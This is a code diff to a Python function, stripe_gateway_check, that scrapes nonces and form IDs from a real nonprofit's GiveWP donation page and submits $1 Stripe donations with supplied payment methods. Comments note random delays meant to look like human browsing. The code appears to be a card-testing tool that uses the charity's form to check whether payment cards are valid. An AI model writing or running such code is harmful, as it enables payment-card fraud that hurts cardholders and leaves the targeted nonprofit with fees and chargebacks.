@@ -1501,16 +1501,38 @@ async def stripe_gateway_check(
                     await exponential_backoff(attempt)
                     continue
 
-                # Extract form ID and nonce if available
-                form_id_match = re.search(r'data-id="(\d+)"', page_html)
-                form_id = form_id_match.group(1) if form_id_match else "1"
+                # Extract checkout_nonce from give_global_vars (REQUIRED for form submission)
+                checkout_nonce_match = re.search(r'"checkout_nonce":\s*"([^"]+)"', page_html)
+                checkout_nonce = checkout_nonce_match.group(1) if checkout_nonce_match else ""
 
+                # Extract ajaxNonce from give_global_vars
+                ajax_nonce_match = re.search(r'"ajaxNonce":\s*"([^"]+)"', page_html)
+                ajax_nonce = ajax_nonce_match.group(1) if ajax_nonce_match else ""
+
+                # Extract form ID - try multiple patterns
+                form_id = "1"  # Default
+                form_id_patterns = [
+                    r'data-id="(\d+)"',
+                    r'"give-form-id"[^>]*value="(\d+)"',
+                    r'give-form-id["\']?\s*[:=]\s*["\']?(\d+)',
+                    r'form_id["\']?\s*[:=]\s*["\']?(\d+)',
+                ]
+                for pattern in form_id_patterns:
+                    form_id_match = re.search(pattern, page_html, re.IGNORECASE)
+                    if form_id_match:
+                        form_id = form_id_match.group(1)
+                        break
+
+                # Extract give_stripe_nonce if available
                 nonce_match = re.search(r'give[_-]?stripe[_-]?nonce["\']?\s*[:=]\s*["\']([^"\']+)["\']', page_html, re.IGNORECASE)
-                nonce = nonce_match.group(1) if nonce_match else ""
+                stripe_nonce = nonce_match.group(1) if nonce_match else ""
 
                 # Extract form nonce/security token
                 form_nonce_match = re.search(r'give[_-]?form[_-]?nonce["\']?\s*[:=]\s*["\']([^"\']+)["\']', page_html, re.IGNORECASE)
                 form_nonce = form_nonce_match.group(1) if form_nonce_match else ""
+
+                if logger:
+                    logger.debug(f"Extracted: checkout_nonce={checkout_nonce[:8] if checkout_nonce else 'N/A'}..., ajax_nonce={ajax_nonce[:8] if ajax_nonce else 'N/A'}...")
 
                 # =============================================================
                 # RANDOM DELAY: Simulate human reading the page (1-3 seconds)
@@ -1614,28 +1636,59 @@ async def stripe_gateway_check(
 
                 give_url = "https://ncopengov.org/wp-admin/admin-ajax.php"
 
+                # Build complete GiveWP form data with all required fields
                 give_data = {
+                    # Core action
                     "action": "give_process_donation",
                     "give_ajax": "true",
+
+                    # Form identification
                     "give-form-id": form_id,
-                    "give-form-title": "NC Open Government Coalition Membership",
+                    "give-form-id-prefix": f"{form_id}-1",
+                    "give-form-title": "NCOGC Membership",
                     "give-form-hash": "",
+                    "give-current-url": STRIPE_DONATION_URL,
+                    "give-form-url": STRIPE_DONATION_URL,
+
+                    # Payment details - $1 Student Member (price-id 1)
                     "give-gateway": "stripe",
                     "give-price-id": "1",
                     "give_total": "1.00",
+                    "give-amount": "1.00",
+                    "give_payment_mode": "stripe",
+
+                    # Stripe payment method from Step 2
+                    "give_stripe_payment_method": pm_id,
+
+                    # Donor information
                     "give_email": email,
                     "give_first": first_name,
                     "give_last": last_name,
-                    "give_payment_mode": "stripe",
-                    "give_stripe_payment_method": pm_id,
-                    "give-recurring-period": "",
+
+                    # Company donation (No)
+                    "give_company_name": "",
+                    "give_is_company_donation": "0",
+
+                    # Anonymous donation (No)
+                    "give_anonymous_donation": "0",
+
+                    # Terms agreement
                     "give_agree_to_terms": "1",
+
+                    # Recurring (disabled)
+                    "give-recurring-period": "",
+
+                    # Security nonces (CRITICAL for form validation)
+                    "give-form-nonce": checkout_nonce,  # Main checkout nonce
                 }
 
-                if nonce:
-                    give_data["give_stripe_nonce"] = nonce
+                # Add additional nonces if extracted
+                if stripe_nonce:
+                    give_data["give_stripe_nonce"] = stripe_nonce
                 if form_nonce:
                     give_data["give-form-nonce"] = form_nonce
+                if ajax_nonce:
+                    give_data["give-ajax-nonce"] = ajax_nonce
 
                 give_headers = {
                     "User-Agent": user_agent,
